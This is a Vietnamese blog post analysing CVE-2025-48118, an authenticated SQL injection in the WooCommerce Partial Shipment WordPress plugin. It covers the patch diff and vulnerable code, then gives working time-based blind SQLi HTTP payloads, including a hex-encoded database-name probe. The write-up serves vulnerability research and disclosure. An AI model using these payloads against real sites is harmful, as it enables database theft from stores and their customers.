<!DOCTYPE html>
<html lang="vi">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>CVE-2025-48118 Analysis &amp; POC - w41bu1</title><meta name="Description" content="Security Vulnerability in WordPress Woocommerce Partial Shipment Plugin."><meta property="og:url" content="http://localhost:1313/vi/2025-09-29-cve-2025-48118/">
  <meta property="og:site_name" content="w41bu1">
  <meta property="og:title" content="CVE-2025-48118 Analysis &amp; POC">
  <meta property="og:description" content="Security Vulnerability in WordPress Woocommerce Partial Shipment Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-09-29T19:54:00+07:00">
    <meta property="article:modified_time" content="2025-09-29T19:54:00+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Sqli">
    <meta property="og:image" content="http://localhost:1313/logo.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/logo.png">
  <meta name="twitter:title" content="CVE-2025-48118 Analysis &amp; POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress Woocommerce Partial Shipment Plugin.">
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt">
<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/vi/2025-09-29-cve-2025-48118/" /><link rel="prev" href="http://localhost:1313/vi/2025-09-28-cve-2025-30936/" /><link rel="next" href="http://localhost:1313/vi/2025-09-30-cve-2025-2011/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "CVE-2025-48118 Analysis \u0026 POC",
        "inLanguage": "vi",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/vi\/2025-09-29-cve-2025-48118\/"
        },"image": ["http:\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "analyst, plugin, sqli","wordcount":  933 ,
        "url": "http:\/\/localhost:1313\/vi\/2025-09-29-cve-2025-48118\/","datePublished": "2025-09-29T19:54:00+07:00","dateModified": "2025-09-29T19:54:00+07:00","license": "Tác phẩm này được cấp phép theo Giấy phép Creative Commons Ghi công - Phi thương mại 4.0 Quốc tế.","publisher": {
            "@type": "Organization",
            "name": "w41bu1","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/localhost:1313\/images\/avatar.jpeg",
                    "width":  736 ,
                    "height":  736 
                }},"author": {
                "@type": "Person",
                "name": "w41bu1"
            },"description": "Security Vulnerability in WordPress Woocommerce Partial Shipment Plugin."
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
          const query = window.matchMedia('(prefers-color-scheme: dark)');
          function applyTheme() {
            let theme = window.localStorage?.getItem('theme') || 'auto';
            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
            document.body.setAttribute('theme', isDark? 'dark' : 'light');
            document.body.setAttribute('cfg-theme', theme);
          }

          applyTheme();
          query.addEventListener('change', applyTheme);
        </script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/vi/" title="w41bu1"><span class="header-title-pre"><i class='fa-solid fa-bug fa-fw' aria-hidden='true'></i></span>w41bu1</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/vi/posts/"> Posts </a><a class="menu-item" href="/vi/tags/"> Tags </a><a class="menu-item" href="/vi/categories/"> Categories </a><a class="menu-item" href="/vi/categories/documentation/"> Docs </a><a class="menu-item" href="/vi/about/"> About </a><a class="menu-item" href="https://github.com/dillonzq/LoveIt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Tìm kiếm..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Đổi chủ đề">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a><a href="javascript:void(0);" class="menu-item language" title="Chọn Ngôn ngữ">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>                      
                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2025-09-29-cve-2025-48118/">English</option><option value="/vi/2025-09-29-cve-2025-48118/" selected>Vietnamese</option></select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/vi/" title="w41bu1"><span class="header-title-pre"><i class='fa-solid fa-bug fa-fw' aria-hidden='true'></i></span>w41bu1</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Tìm kiếm..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Huỷ
                    </a>
                </div><a class="menu-item" href="/vi/posts/" title="">Posts</a><a class="menu-item" href="/vi/tags/" title="">Tags</a><a class="menu-item" href="/vi/categories/" title="">Categories</a><a class="menu-item" href="/vi/categories/documentation/" title="">Docs</a><a class="menu-item" href="/vi/about/" title="">About</a><a class="menu-item" href="https://github.com/dillonzq/LoveIt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Đổi chủ đề">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a><a href="javascript:void(0);" class="menu-item" title="Chọn Ngôn ngữ">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
                    <select class="language-select" onchange="location = this.value;"><option value="/2025-09-29-cve-2025-48118/">English</option><option value="/vi/2025-09-29-cve-2025-48118/" selected>Vietnamese</option></select>
                </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Nội dung</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CVE-2025-48118 Analysis & POC</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://w41bu1.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>w41bu1</a></span>&nbsp;<span class="post-category">trong <a href="/vi/categories/cve-analyst/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CVE Analyst</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-09-29">2025-09-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;933 từ&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 phút&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/2025-09-29-cve-2025-48118/app.png"
        data-srcset="/2025-09-29-cve-2025-48118/app.png, /2025-09-29-cve-2025-48118/app.png 1.5x, /2025-09-29-cve-2025-48118/app.png 2x"
        data-sizes="auto"
        alt="/2025-09-29-cve-2025-48118/app.png"
        title="Security Vulnerability in WordPress Woocommerce Partial Shipment Plugin." width="1544" height="500" /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Nội dung</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#patch-diff">Patch Diff</a></li>
        <li><a href="#how-it-work">How it work?</a></li>
      </ul>
    </li>
    <li><a href="#exploit">Exploit</a>
      <ul>
        <li><a href="#detect-sqli">Detect SQLi</a></li>
        <li><a href="#get-first-letter-of-database-name">Get First Letter of Database Name</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><hr>
<p>Lỗ hổng xảy ra trên plugin <strong>Woocommerce Partial Shipment</strong> của WordPress trước phiên bản <strong>3.3</strong>. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-48118" target="_blank" rel="noopener noreffer ">CVE-2025-48118</a></li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/wc-partial-shipment/advanced/" target="_blank" rel="noopener noreffer ">WordPress Woocommerce Partial Shipment Plugin</a></li>
<li><strong>Vulnerability Type</strong>: SQL Injection</li>
<li><strong>Affected Versions</strong>: &lt;= 3.2</li>
<li><strong>CVSS severity</strong>:  High (8.5)</li>
<li><strong>Required Privilege</strong>: Subscriber</li>
</ul>
<hr>
<h2 id="requirements">Requirements</h2>
<ul>
<li><a href="https://w41bu1.github.io/posts/wordpress-local-and-debugging/" target="_blank" rel="noopener noreffer "><strong>Local WordPress and Debugging</strong></a></li>
<li><strong>Woocommerce Partial Shipment</strong>:  v3.2(vul) và v3.3(fix)</li>
<li><strong>diff tool</strong>: <strong>meld</strong> hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version</li>
<li><strong>Actived WooCommerce plugin</strong>: plugin bắt buộc <strong>actived</strong> trước khi cài <strong>Woocommerce Partial Shipment Plugin</strong>, một số hàm trong <strong>WooCommerce</strong> sẽ được sử dụng.</li>
</ul>
<hr>
<h2 id="analysis">Analysis</h2>
<p>Nguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ <strong>POST</strong> request vào SQL query mà không có cơ chế kiểm soát chặt chẽ.</p>
<h3 id="patch-diff">Patch Diff</h3>
<p>Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.
Có sự khác biệt rõ ở file <strong>wc-partial-shipment/woocommerce-partial-shipment.php</strong></p>
<p>Nhưng ở đây, dev thay đổi khá nhiều ta khó để tìm được vị trí lỗi.</p>
<blockquote>
<p>Trong WordPress, để SQLi xảy ra, ứng dụng phải tương tác với database thông qua biến global <code>$wpdb</code>, ta search từ khóa này trong file <strong>wc-partial-shipment/woocommerce-partial-shipment.php</strong> để tìm sink.</p>
</blockquote>
<p><figure><a class="lightgallery" href="/2025-09-29-cve-2025-48118/search_sink.png" title="search sink" data-thumbnail="/2025-09-29-cve-2025-48118/search_sink.png" data-sub-html="<h2>Kết quả tìm vị trí sink trong mã nguồn</h2><p>search sink</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-09-29-cve-2025-48118/search_sink.png"
            data-srcset="/2025-09-29-cve-2025-48118/search_sink.png, /2025-09-29-cve-2025-48118/search_sink.png 1.5x, /2025-09-29-cve-2025-48118/search_sink.png 2x"
            data-sizes="auto"
            alt="/2025-09-29-cve-2025-48118/search_sink.png" width="1067" height="469" />
    </a><figcaption class="image-caption">Kết quả tìm vị trí sink trong mã nguồn</figcaption>
    </figure></p>
<p><code>get_shipment_id</code> và <code>get_wxp_shipment_data</code> là 2 hàm thuộc class <strong>WXP_Partial_Shipment</strong> đáng chú ý, dữ liệu được đưa thẳng vào câu query mà không có cơ chế kiểm soát nào. Do đó, lỗ hổng SQLi có thể xảy ra.</p>
<p><figure><a class="lightgallery" href="/2025-09-29-cve-2025-48118/patch.png" title="Patch" data-thumbnail="/2025-09-29-cve-2025-48118/patch.png" data-sub-html="<h2>So sánh sự khác biệt giữa bản lỗi và bản vá</h2><p>Patch</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-09-29-cve-2025-48118/patch.png"
            data-srcset="/2025-09-29-cve-2025-48118/patch.png, /2025-09-29-cve-2025-48118/patch.png 1.5x, /2025-09-29-cve-2025-48118/patch.png 2x"
            data-sizes="auto"
            alt="/2025-09-29-cve-2025-48118/patch.png" width="1261" height="508" />
    </a><figcaption class="image-caption">So sánh sự khác biệt giữa bản lỗi và bản vá</figcaption>
    </figure></p>
<p>Bản vá sử dụng <code>$wpdb-&gt;prepare()</code> để chuẩn bị câu query, thay vì <strong>nối trực tiếp dữ liệu từ người dùng</strong>. Điều này đảm bảo rằng tất cả giá trị được <strong>escape đúng cách</strong> trước khi chèn vào SQL, ngăn ngừa nguy cơ SQL Injection.</p>
<h3 id="how-it-work">How it work?</h3>
<p><code>get_shipment_id</code> và <code>get_wxp_shipment_data</code> đều được hàm <code>wxp_order_set_shipped</code> trong cùng class gọi và sử dụng.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">wxp_order_set_shipped</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$order_id</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;order_id&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;order_id&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// other logic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nv">$wxp_shipment</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_wxp_shipment_data</span><span class="p">(</span><span class="nv">$order_id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;order_id&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;order_id&#39;</span><span class="p">]){</span>
</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$wpdb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$shipment_id</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get_shipment_id</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;order_id&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$shipment_id</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;order_id&#39;</span> <span class="o">=&gt;</span><span class="nv">$order_id</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;shipment_id&#39;</span> <span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;shipment_url&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;shipment_num&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;shipment_date&#39;</span><span class="o">=&gt;</span><span class="nx">current_time</span><span class="p">(</span><span class="s1">&#39;timestamp&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">insert</span><span class="p">(</span><span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">prefix</span><span class="o">.</span><span class="s2">&#34;partial_shipment&#34;</span><span class="p">,</span><span class="nv">$data</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;%d&#39;</span><span class="p">,</span><span class="s1">&#39;%d&#39;</span><span class="p">,</span><span class="s1">&#39;%s&#39;</span><span class="p">,</span><span class="s1">&#39;%s&#39;</span><span class="p">,</span><span class="s1">&#39;%s&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$shipment_id</span> <span class="o">=</span> <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">insert_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// other logic     
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">json_encode</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;order_id&#39;</span><span class="o">=&gt;</span><span class="nv">$order_id</span><span class="p">,</span><span class="s1">&#39;status&#39;</span><span class="o">=&gt;</span><span class="nv">$status_key</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>👉 <code>order_id</code> được lấy từ <strong>POST request</strong>, nơi người dùng có thể kiểm soát làm đối số khi gọi hàm <code>get_shipment_id</code> và <code>get_wxp_shipment_data</code>
truyền vào câu query chứa lổ hỗng SQLi.</p>
<p>Để xác định nơi <code>wxp_order_set_shipped</code> được gọi và sử dụng, ta tìm kiếm với từ khóa <code>wxp_order_set_shipped</code> trong thư mục chứa plugin.</p>
<p><figure><a class="lightgallery" href="/2025-09-29-cve-2025-48118/search_1.png" title="Search 1" data-thumbnail="/2025-09-29-cve-2025-48118/search_1.png" data-sub-html="<h2>Tìm vị trí nơi hàm wxp_order_set_shipped được gọi</h2><p>Search 1</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-09-29-cve-2025-48118/search_1.png"
            data-srcset="/2025-09-29-cve-2025-48118/search_1.png, /2025-09-29-cve-2025-48118/search_1.png 1.5x, /2025-09-29-cve-2025-48118/search_1.png 2x"
            data-sizes="auto"
            alt="/2025-09-29-cve-2025-48118/search_1.png" width="1354" height="586" />
    </a><figcaption class="image-caption">Tìm vị trí nơi hàm wxp_order_set_shipped được gọi</figcaption>
    </figure></p>
<p><code>wxp_order_set_shipped</code> được <code>construct</code> của cùng class sử dụng làm callback cho hook <code>wp_ajax_wxp_order_set_shipped</code> =&gt; yêu cầu người dùng phải đăng nhập</p>
<p>👉 Khi truy cập vào <code>/wp-admin/admin-ajax.php</code> với tham số:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>action=wxp_order_set_shipped&amp;order_id=payload_here</code></pre></div>
<ul>
<li>Callback <code>wxp_order_set_shipped</code> được gọi</li>
<li><code>order_id</code> được lấy trực tiếp từ request và chèn vào SQL query.</li>
<li>Query thực thi 2 lần do được truyền vào 2 hàm chạy lệnh SQL với payload độc hại.</li>
</ul>
<hr>
<h2 id="exploit">Exploit</h2>
<h3 id="detect-sqli">Detect SQLi</h3>
<p>Gửi <strong>POST request</strong> chứa payload SQLi.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-http">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-admin/admin-ajax.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="err">...</span>
</span></span><span class="line"><span class="cl"><span class="g">Cookie: cookie_here
</span></span></span><span class="line"><span class="cl"><span class="g">
</span></span></span><span class="line"><span class="cl"><span class="g">action=wxp_order_set_shipped&amp;order_id=(SELECT 1 FROM (SELECT SLEEP(5))a)</span></span></span></code></pre></div></div>
<p>Khi đó câu query sẽ trở thành:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-sql">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">ship_id</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">wp_partial_shipment</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">order_id</span><span class="o">=</span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span><span class="n">a</span><span class="p">)</span></span></span></code></pre></div></div>
<p>Ở đây có 2 nơi thực hiện query nên thời gian phản hồi sẽ tăng gấp đôi</p>
<p><figure><a class="lightgallery" href="/2025-09-29-cve-2025-48118/time_resp.png" title="time response" data-thumbnail="/2025-09-29-cve-2025-48118/time_resp.png" data-sub-html="<h2>Kết quả phản hồi khi khai thác thành công</h2><p>time response</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-09-29-cve-2025-48118/time_resp.png"
            data-srcset="/2025-09-29-cve-2025-48118/time_resp.png, /2025-09-29-cve-2025-48118/time_resp.png 1.5x, /2025-09-29-cve-2025-48118/time_resp.png 2x"
            data-sizes="auto"
            alt="/2025-09-29-cve-2025-48118/time_resp.png" width="376" height="247" />
    </a><figcaption class="image-caption">Kết quả phản hồi khi khai thác thành công</figcaption>
    </figure></p>
<p>Ta sử dụng <strong>subquery trong mệnh đề FROM</strong> vì truy vấn con được coi như một bảng tạm thời. MySQL sẽ thực thi truy vấn con trước để tạo bảng tạm, sau đó mới thực hiện truy vấn chính. Khi so sánh theo từng row, <code>SLEEP</code> chỉ chạy một lần trong quá trình khởi tạo bảng tạm, các lần so sánh tiếp theo sẽ không thực thi lại, nhờ đó tránh việc <code>SLEEP</code> bị nhân nhiều lần.</p>
<p>Ví dụ khi gửi request với payload này:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-http">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-admin/admin-ajax.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="err">...</span>
</span></span><span class="line"><span class="cl"><span class="g">Cookie: cookie_here
</span></span></span><span class="line"><span class="cl"><span class="g">
</span></span></span><span class="line"><span class="cl"><span class="g">action=wxp_order_set_shipped&amp;order_id=(SELECT SLEEP(5))</span></span></span></code></pre></div></div>
<p>Thời gian trả về tăng theo cấp số nhân</p>
<p><figure><a class="lightgallery" href="/2025-09-29-cve-2025-48118/search_2.png" title="search 2" data-thumbnail="/2025-09-29-cve-2025-48118/search_2.png" data-sub-html="<h2>Thời gian phản hồi tăng theo cấp số nhân</h2><p>search 2</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-09-29-cve-2025-48118/search_2.png"
            data-srcset="/2025-09-29-cve-2025-48118/search_2.png, /2025-09-29-cve-2025-48118/search_2.png 1.5x, /2025-09-29-cve-2025-48118/search_2.png 2x"
            data-sizes="auto"
            alt="/2025-09-29-cve-2025-48118/search_2.png" width="364" height="209" />
    </a><figcaption class="image-caption">Thời gian phản hồi tăng theo cấp số nhân</figcaption>
    </figure></p>
<h3 id="get-first-letter-of-database-name">Get First Letter of Database Name</h3>
<p>Điều kiện tiên quyết để <strong>dump được hết data</strong> là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì gần như toàn bộ data đều dump được.</p>
<p>Gửi request với <strong>SQLi payload</strong>:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-http">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-admin/admin-ajax.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="err">...</span>
</span></span><span class="line"><span class="cl"><span class="g">Cookie: cookie_here
</span></span></span><span class="line"><span class="cl"><span class="g">
</span></span></span><span class="line"><span class="cl"><span class="g">action=wxp_order_set_shipped&amp;order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a)</span></span></span></code></pre></div></div>
<p>Sử dụng <code>SUBSTRING()</code> để lấy ký tự đầu tiên của <strong>database name</strong>, <code>IF()</code> trả về <code>SLEEP(5)</code> nếu ký tự đó là <code>0x77</code>(&lsquo;w&rsquo;)</p>
<p>Sử dụng hex encoding <code>w</code> thành <code>0x77</code> vì <code>order_id</code> được lấy từ <strong>POST</strong> request trong nên bị escape bởi <a href="https://patchstack.com/academy/wordpress/vulnerabilities/sql-injection/#magic-quotes" target="_blank" rel="noopener noreffer ">magic quotes</a> trong WordPress và bởi <code>sanitize_text_field</code>.</p>
